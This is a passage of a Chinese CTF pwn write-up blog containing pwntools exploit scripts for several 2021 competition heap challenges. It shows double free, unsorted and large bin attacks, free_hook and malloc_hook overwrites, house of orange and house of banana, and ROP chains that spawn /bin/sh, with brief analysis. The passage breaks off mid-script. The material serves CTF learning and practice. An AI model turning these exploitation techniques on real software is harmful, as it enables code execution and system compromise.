<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="长安杯-2021学生组-baige"><a class="header-anchor" href="#长安杯-2021学生组-baige">¶</a>[长安杯 2021学生组]baige</h2>
<h3 id="题目考点-v4"><a class="header-anchor" href="#题目考点-v4">¶</a>题目考点</h3>
<pre><code>1.unsorted bin attact 
2.逻辑漏洞
</code></pre>
<h3 id="IDA-分析-v2"><a class="header-anchor" href="#IDA-分析-v2">¶</a>IDA 分析</h3>
<p>本题功能add,show,edit,delete一应俱全</p>
<p>漏洞点在add函数中</p>
<p><img src="http://static.zybuluo.com/hgggg/hp8iw26kpnaymkagp0xsst0w/6.png" alt="6.png-37.4kB"></p>
<p>add 函数用一个数组来储存size，<strong>而且在进入检查之前就会对数组中的值赋值</strong>，这就意味着我可以利用这点来修改已经申请到的堆块的大小造成堆溢出</p>
<h3 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h3>
<p>Step1: leak libc<br>
本题题目环境位2.27需要填满tacahe,来Unsorted bin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)  <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br></pre></td></tr></table></figure>
<p>Step2: 利用逻辑漏洞制造堆溢出，打free_hook来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;fff&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook =  libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-祥云杯-note"><a class="header-anchor" href="#2021-祥云杯-note">¶</a>[2021 祥云杯]note</h2>
<h3 id="题目分析-v2"><a class="header-anchor" href="#题目分析-v2">¶</a>题目分析</h3>
<p>具体分析见我house of orange 那篇笔记</p>
<h3 id="exp-v9"><a class="header-anchor" href="#exp-v9">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;ggg&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28009</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">content1,content2</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">  p.send(content1)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">  p.sendline(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">top_chunk = heap_addr + <span class="number">0x30</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfc1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4c28</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-祥云杯-PasswordBox-ProVersion"><a class="header-anchor" href="#2021-祥云杯-PasswordBox-ProVersion">¶</a>[2021 祥云杯]PasswordBox ProVersion</h2>
<h3 id="题目分析-v3"><a class="header-anchor" href="#题目分析-v3">¶</a>题目分析</h3>
<p>功能与FreeVersion 相似，多了完整的edit和show,以及一个recover可以恢复被释放掉的堆块</p>
<p>但是题目所给的libc版本位2.31，且程序能够显式的执行exit函数，这就想到了ha1vk师傅提出的高版本glibc的利用方式，house of banana(链接：“<a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a>”)</p>
<p>然后就是一波依葫芦画瓢</p>
<h3 id="EXP-v3"><a class="header-anchor" href="#EXP-v3">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x428</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#5</span></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ec010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rtl_global = libc_base + <span class="number">0x1f4000</span> + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3D</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x14E</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base + <span class="number">0x00000000000276e9</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1b75aa</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_addr = (u64(p.recv(<span class="number">8</span>))^key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(rtl_global - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>,<span class="string">b&#x27;large bin attack!!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(rtl_global+<span class="number">0x221730</span>-<span class="number">0x220060</span>+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(heap_addr + <span class="number">0x960</span>)</span><br><span class="line">payload += p64(set_context) + p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_rbp_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x10</span> + <span class="number">0x110</span>)*<span class="number">0x3</span></span><br><span class="line">payload += p64(<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x31C</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x420</span> + p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span 